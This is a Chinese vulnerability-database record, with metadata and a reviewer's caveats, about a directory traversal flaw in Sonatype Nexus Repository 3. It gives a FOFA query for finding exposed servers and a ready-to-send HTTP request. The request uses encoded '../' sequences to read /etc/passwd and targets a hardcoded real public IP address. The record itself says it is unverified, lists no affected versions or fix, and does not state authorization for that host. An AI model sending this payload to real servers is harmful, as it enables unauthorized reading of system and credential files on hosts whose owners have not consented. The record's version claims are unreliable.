---

source: "wy876 漏洞文库"
product: "Nexus3/路径遍历"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_role: "unknown"
identifier_status: "unknown"
title: "SonatypeNexusRepository3存在目录遍历漏洞"
prerequisites: "来源所述条件，未列明部分仍待核：只有产品名，无范围/修复"
side_effects: "未执行；原文未提供完整的状态变化与恢复证据，实际操作影响按本文入口、进程权限和实验条件核对"
source_status: "unknown"
id: "vw-7741aec8f0d3f755c116d622"
entity_id: "ve-7741aec8f0d3f755c116d622"
schema_version: "1"
---

## 核对与使用边界

本文已按保存的全文审阅记录进行文字校订；本轮仅静态核对，未运行 PoC、请求目标或逐图验证。

适用条件与版本记录（来源主张，未列为明确更正的部分仍待权威资料核对）：只有产品名，无范围/修复

代码与实验材料：单GET与383精确相同路径，硬编码公网IP、无结果

来源证据范围：wy876/语雀，缺官方公告

- **事实待核（1）**：缺编号/范围/验证证据；依据：仅产品和一个请求，无响应及环境。该项尚不能从转载本身确定外部事实；下文相应编号、版本或修复说法只作为来源记录，不能据此判定部署受影响或已修复。明确更正另列于本节。

- **结论使用边界（2）**：公开目标的授权未说明；依据：Host为162.19.64.171:8081，历史样例不代表当前访问授权。此项限制直接适用于下文对应结论；现有正文不足以作更宽泛推论，所列方法和原始证据均保留。

历史原文标识：下文原技术材料按来源保留；仅本节明确确认的更正替代相应旧说法，标为待核的观察仍不是事实确认。

# Sonatype Nexus Repository 3存在目录遍历漏洞

# 一、漏洞简介
 Sonatype Nexus Repository 3是一个universal repository manager，用于管理和代理各种软件组件、工件和依赖项。它支持多种格式，包括Java、npm、PyPI、Docker、 Helm 等。    Sonatype Nexus Repository 3 目录遍历漏洞，恶意攻击者可能利用该漏洞读取服务器上的敏感文件。  

# 二、影响版本
+   Sonatype Nexus Repository 

# 三、资产测绘
+ fofa`app="Nexus-Repository-Manager"`
+ 特征


# 四、漏洞复现
```plain
GET /%2F%2F%2F%2F%2F%2F%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd HTTP/1.1
Host: 162.19.64.171:8081
Accept: */*
Accept-Language: en-US;q=0.9,en;q=0.8
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36
Connection: close
Cache-Control: max-age=0
```


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/rx4pgbpa10t7pmtr>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
